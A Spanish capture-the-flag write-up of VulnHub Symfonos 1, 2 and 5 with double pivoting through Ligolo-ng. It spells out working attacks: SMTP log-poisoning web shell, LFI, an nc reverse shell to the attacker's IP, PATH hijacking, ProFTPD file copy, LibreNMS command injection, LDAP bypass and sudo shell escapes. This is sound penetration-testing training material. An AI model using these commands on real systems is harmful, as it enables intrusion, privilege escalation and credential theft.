# Writeup - Doble Pivoting Ligolo-ng + Symfonos 1 · 2 · 5 (VulnHub)

**Laboratorio:** Doble Pivoting con Ligolo-ng  
**Plataforma:** VulnHub + VMware  
**Sistema:** Debian Linux (3 máquinas)  
**IPs:** Kali 192.168.1.158 | Symfonos1 192.168.1.162 / 10.10.10.128 | Symfonos2 10.10.10.129 / 20.20.20.128 | Symfonos5 20.20.20.129  
**Objetivo:** Atravesar 2 saltos de red con Ligolo-ng y comprometer 3 máquinas hasta obtener flag root en cada una

---

## Resumen

Laboratorio de doble pivoting real con Ligolo-ng (primer salto en modo connect, segundo en modo bind). Desde Kali se compromete Symfonos1 (WordPress LFI + SMTP log poisoning → PATH hijack a root). Se despliega Ligolo para pivotar a la red vmnet2. Se compromete Symfonos2 (ProFTPD file copy → crack shadow → LibreNMS RCE → sudo mysql a root). Segundo pivote con Ligolo bind a vmnet3. Finalmente Symfonos5 (LDAP injection → LFI → creds LDAP → sudo dpkg a root). Todo el recorrido sin necesidad de listeners intermedios, usando `connect_agent` directo desde el proxy.

---

## 1. Reconocimiento Inicial

### arp-scan — Red local

```bash
sudo arp-scan -I eth0 --localnet
```

```
192.168.1.162   00:0c:29:61:ea:27   (VMware)   ← Symfonos1
```

### Nmap — Symfonos1

```bash
nmap -p- -sS --open --min-rate=5000 -n -Pn 192.168.1.162 -oG tcp_ports.txt
nmap -p22,25,80,139,445 -sCV 192.168.1.162 -oN full_scan.txt
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian
25/tcp  open  smtp        Postfix (VRFY, ETRN, STARTTLS)
80/tcp  open  http        Apache 2.4.25 (Debian)
139/tcp open  netbios-ssn Samba 4.5.16
445/tcp open  microsoft-ds Samba 4.5.16
```

---

## 2. Symfonos:1 — Explotación (helios → root)

### 2.1 SMB — Share anonymous

```bash
smbmap -H 192.168.1.162
```

```
anonymous   READ ONLY
```

```bash
smbclient -N //192.168.1.162/anonymous
```

`attention.txt` revela usuario `Zeus` y contraseñas débiles: `epidioko`, `qwerty`, `baseball`.

### 2.2 SMB — Share helios

```bash
smbclient //192.168.1.162/helios -U helios
# Password: qwerty
```

`todo.txt` → ruta `/h3l105`.

### 2.3 WordPress — Mail Masta LFI

WordPress 5.2.2 en `http://symfonos.local/h3l105/` con plugin **mail-masta v1.0** (LFI).

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

Vemos usuario `helios:x:1000:1000:,,,:/home/helios:/bin/bash`.

### 2.4 SMTP Log Poisoning → RCE

Inyectamos PHP en el log de correos vía SMTP:

```bash
telnet 192.168.1.162 25
mail from: <?php system($_GET["cmd"]); ?>
rcpt to: helios
data
test
.
quit
```

Ejecutamos comandos:

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id"
```

Reverse shell:

```bash
# Kali
penelope 4444

curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e+/bin/bash+192.168.1.158+4444"
```

*Penelope otorga una TTY completa automáticamente.*

### 2.5 Escalada a root — SUID PATH Hijacking

```bash
helios@symfonos:/$ find / -perm -4000 -type f 2>/dev/null
/opt/statuscheck    # SUID root
```

```bash
helios@symfonos:/$ strings /opt/statuscheck
system("curl -I http://localhost");
```

Sin ruta absoluta → PATH hijacking:

```bash
helios@symfonos:/tmp$ echo '#!/bin/bash' > /tmp/curl
helios@symfonos:/tmp$ echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /tmp/curl
helios@symfonos:/tmp$ chmod 4777 /tmp/curl
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/tmp$ /opt/statuscheck
helios@symfonos:/tmp$ /tmp/rootbash -p
rootbash-4.4# cat /root/proof.txt
```

---

## 3. Ligolo-ng — Primer Pivote (Kali → Symfonos1 → vmnet2)

### 3.1 Transferencia del agente a Symfonos1

Desde la shell como `helios` descargamos el binario del agente:

```bash
# Kali — servidor HTTP
python3 -m http.server 8000

# Symfonos1 (shell helios)
wget http://192.168.1.158:8000/agent -O /tmp/agent
chmod +x /tmp/agent
```

### 3.2 Proxy en Kali

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy --selfcert
```

### 3.3 Agente en Symfonos1

```bash
/tmp/agent -connect 192.168.1.158:11601 -ignore-cert
```

```
ligolo-ng » session
[Agent : helios@symfonos] » start
```

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

```bash
ping 10.10.10.128        # OK — Symfonos1
nmap -sn 10.10.10.0/24   # Descubrimos 10.10.10.129 (Symfonos2)
```

---

## 4. Symfonos:2 — Explotación (aeolus → cronus → root)

### 4.1 Nmap

```bash
nmap -p- -sS --open --min-rate=5000 -n -Pn 10.10.10.129
```

```
21/tcp   ftp       ProFTPD 1.3.5
22/tcp   ssh       OpenSSH 7.4p1 Debian
80/tcp   http      webfs 1.21
139/tcp  netbios-ssn Samba 4.5.16
445/tcp  netbios-ssn Samba 4.5.16
```

### 4.2 SMB — log.txt → shadow path

```bash
smbclient -N //10.10.10.129/anonymous
```

`backups/log.txt`:

```
[2019-07-03 11:20:35] [FTP] User aeolus authenticated
[2019-07-03 11:20:35] [FTP] File /var/backups/shadow.bak copied to /home/aeolus/share/shadow
```

### 4.3 ProFTPD 1.3.5 — File Copy (CVE-2015-3306)

Copiamos `/var/backups/shadow.bak` al share SMB anónimo:

```bash
telnet 10.10.10.129 21
USER anonymous
PASS anonymous
CPFR /var/backups/shadow.bak
CPTO /home/aeolus/share/shadow
```

```bash
smbclient -N //10.10.10.129/anonymous
smb: \> get backups/shadow
```

### 4.4 Crack de hash — SSH aeolus

```bash
hashcat -m 1800 -a 0 shadow /usr/share/wordlists/rockyou.txt
# aeolus:sergioteamo
```

```bash
ssh aeolus@10.10.10.129
# Password: sergioteamo
```

### 4.5 LibreNMS — Authenticated RCE

Puerto `8080` en localhost. Port forward SSH:

```bash
ssh -L 8080:127.0.0.1:8080 aeolus@10.10.10.129
```

Visitamos `http://127.0.0.1:8080` → LibreNMS 1.46. Login: `aeolus:sergioteamo`.

Vulnerabilidad: **addhost command injection** (parámetro `community` sin sanitizar → `popen()`).

```bash
python 47044.py http://localhost:8080 "XSRF-Token=...;librenms_session=...;PHPSESSID=..." 10.10.10.128 4444
```

```bash
# Kali
penelope 4444
```

*Penelope otorga una TTY completa automáticamente.*

### 4.6 Escalada a root — sudo mysql

```bash
cronus@symfonos2:/$ sudo -l
(root) NOPASSWD: /usr/bin/mysql
```

```bash
cronus@symfonos2:/$ sudo mysql -e '\! /bin/sh'
# whoami
root
# cat /root/proof.txt
```

---

## 5. Ligolo-ng — Segundo Pivote (Kali → Symfonos2 → vmnet3)

### 5.1 Transferencia del agente a Symfonos2

```bash
# Kali
scp agent aeolus@10.10.10.129:/tmp/agent

# Symfonos2 (SSH aeolus)
chmod +x /tmp/agent
```

### 5.2 Bind Agent en Symfonos2

```bash
/tmp/agent -bind 0.0.0.0:5555
```

### 5.3 connect_agent desde el proxy

```
ligolo-ng » connect_agent --ip 10.10.10.129:5555
INFO[0000] Agent connected. id=000c29a7ec38 name=aeolus@symfonos2
```

### 5.4 Segundo túnel

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo_2nd
sudo ip link set ligolo_2nd up
```

```
[Agent : aeolus@symfonos2] » tunnel_start --tun ligolo_2nd
```

### 5.5 Verificación

```bash
ping 20.20.20.129  # Symfonos5 — OK
```

---

## 6. Symfonos:5 — Explotación (zeus → root)

### 6.1 Nmap

```bash
nmap -p- -sS --open --min-rate=5000 -n -Pn 20.20.20.129
```

```
22/tcp   open     ssh
80/tcp   open     http
389/tcp  open     ldap
636/tcp  open     ldapssl
```

### 6.2 LDAP Injection — Bypass Login

Panel `admin.php` se autentica contra LDAP. Payload bypass:

```
Username: *
Password: *
```

Acceso concedido → redirige a `home.php?url=...`.

### 6.3 LFI con PHP Wrappers → Credenciales LDAP

```bash
curl -s "http://20.20.20.129/home.php?url=php://filter/convert.base64-encode/resource=admin.php" | base64 -d
```

Obtenemos credenciales LDAP: `cn=admin,dc=symfonos,dc=local` / `qMDdyZh3cT6eeAWD`.

### 6.4 Dump LDAP → SSH zeus

```bash
ldapsearch -x -LLL -h 20.20.20.129 \
  -D 'cn=admin,dc=symfonos,dc=local' \
  -w qMDdyZh3cT6eeAWD \
  -b 'dc=symfonos,dc=local'
```

Extraemos `zeus:cetkKf4wCuHC9FET` (password en base64).

```bash
ssh zeus@20.20.20.129
# Password: cetkKf4wCuHC9FET
```

### 6.5 Escalada a root — sudo dpkg

```bash
zeus@symfonos5:~$ sudo -l
(root) NOPASSWD: /usr/bin/dpkg
```

GTFOBins — dpkg:

```bash
zeus@symfonos5:~$ sudo dpkg -l
!/bin/bash
root@symfonos5:/# cat /root/proof.txt
```

---

## Resumen de la cadena de ataque

| Paso | Máquina | Técnica | Resultado |
|-------|---------|---------|-----------|
| 1 | Symfonos1 | SMB → WordPress mail-masta LFI → SMTP log poisoning | RCE como `helios` |
| 2 | Symfonos1 | SUID `/opt/statuscheck` — PATH hijacking | Shell `root` + flag |
| 3 | *Pivote 1* | Ligolo proxy + agent → `ip route add 10.10.10.0/24` | Acceso a vmnet2 |
| 4 | Symfonos2 | ProFTPD 1.3.5 file copy → shadow crack → SSH | Shell `aeolus` |
| 5 | Symfonos2 | LibreNMS 1.46 addhost RCE → sudo mysql | Shell `root` + flag |
| 6 | *Pivote 2* | Ligolo bind `agent -bind` → `connect_agent` → 2º TUN | Acceso a vmnet3 |
| 7 | Symfonos5 | LDAP injection `*:*` → LFI → php filter → creds LDAP | SSH `zeus` |
| 8 | Symfonos5 | sudo dpkg → `!/bin/bash` | Shell `root` + flag |

### Ligolo-ng — Esquema de túneles

```
Kali:192.168.1.158
  │
  ├─ [proxy:11601] ── túnel (ligolo) ── [agent: Symfonos1:10.10.10.128]
  │                                         │
  │                                         └── ruta vmnet2: 10.10.10.129 (Symfonos2)
  │
  ├─ [proxy:connect_agent] ── túnel (ligolo_2nd) ── [agent: Symfonos2:20.20.20.128]
  │                                                     │
  │                                                     └── ruta vmnet3: 20.20.20.129 (Symfonos5)
  │
  └─ SSH a Symfonos5 (20.20.20.129) a través del doble túnel
```

**Doble pivote completado.** Ningún listener intermedio necesario — solo bind agents y `connect_agent` desde el proxy. La máquina objetivo final (Symfonos5) no ejecuta Ligolo.
